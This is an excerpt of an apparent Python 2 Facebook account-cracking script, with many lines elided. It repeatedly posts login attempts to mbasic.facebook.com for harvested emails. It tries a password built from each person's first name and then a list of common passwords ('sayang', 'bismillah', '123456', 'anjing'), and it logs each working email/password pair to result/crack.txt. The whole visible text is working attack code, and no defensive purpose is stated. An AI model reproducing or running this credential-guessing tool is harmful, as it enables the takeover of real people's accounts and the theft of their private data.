    	...
    	def main(arg):
        	...
        	try:
           		...
           		pw = v['first_name'].lower()
            		rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Android; Tablet; rv:112.0esr) Gecko/112.0esr Firefox/112.0esr"})
            		xo = rex.content
            		if 'mbasic_logout_button' in xo or 'save-device' in xo:
                		...
                		if 'checkpoint' in xo:
                    			...
                    			rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw2, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Android; Tablet; rv:112.0esr) Gecko/112.0esr Firefox/112.0esr"})
                    			xo = rex.content
                    			if 'mbasic_logout_button' in xo or 'save-device' in xo:
                        			print '   [OK] '+em+' | '+pw2+' | '+bt
                        			oke = open('result/crack.txt', 'a')
                        			...
                        			if 'checkpoint' in xo:
                            				...
                            				rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw3, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Android; Tablet; rv:112.0esr) Gecko/112.0esr Firefox/112.0esr"})
                            				xo = rex.content
                            				if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                				print '   [OK] '+em+' | '+pw3+' | '+bt
                                				oke = open('result/crack.txt', 'a')
                                				...
                                				if 'checkpoint' in xo:
                            						...
                            						rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw4, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Android; Tablet; rv:112.0esr) Gecko/112.0esr Firefox/112.0esr"})
                            						xo = rex.content
                            						if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                						print '   [OK] '+em+' | '+pw4+' | '+bt
                                						oke = open('result/crack.txt', 'a')
                                						...
                                						if 'checkpoint' in xo:
                            								...
                            								pw5 = 'sayang'
                            								rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw5, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Android; Tablet; rv:112.0esr) Gecko/112.0esr Firefox/112.0esr"})
                            								xo = rex.content
                            								if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                								print '   [OK] '+em+' | '+pw5+' | '+bt
                                								oke = open('result/crack.txt', 'a')
                                								...
                                								if 'checkpoint' in xo:
                            										...
                            										pw6 = 'bismillah'
                            										rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw6, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Android; Tablet; rv:112.0esr) Gecko/112.0esr Firefox/112.0esr"})
                            										xo = rex.content
                            										if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                										print '   [OK] '+em+' | '+pw6+' | '+bt
                                										oke = open('result/crack.txt', 'a')
                                										...
                                										if 'checkpoint' in xo:
                            												...
                            												pw7 = '123456'
                            												rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw7, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Android; Tablet; rv:112.0esr) Gecko/112.0esr Firefox/112.0esr"})
                            												xo = rex.content
                            												if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                												print '   [OK] '+em+' | '+pw7+' | '+bt
                                												oke = open('result/crack.txt', 'a')
                                												...
                                												if 'checkpoint' in xo:
                            														...
                            														pw8 = 'anjing'
                            														rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw8, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Android; Tablet; rv:112.0esr) Gecko/112.0esr Firefox/112.0esr"})
                            														xo = rex.content
                            														if 'mbasic_logout_button' in xo or 'save-device' in xo:
                                														print '   [OK] '+em+' | '+pw8+' | '+bt
                                														oke = open('result/crack.txt', 'a')
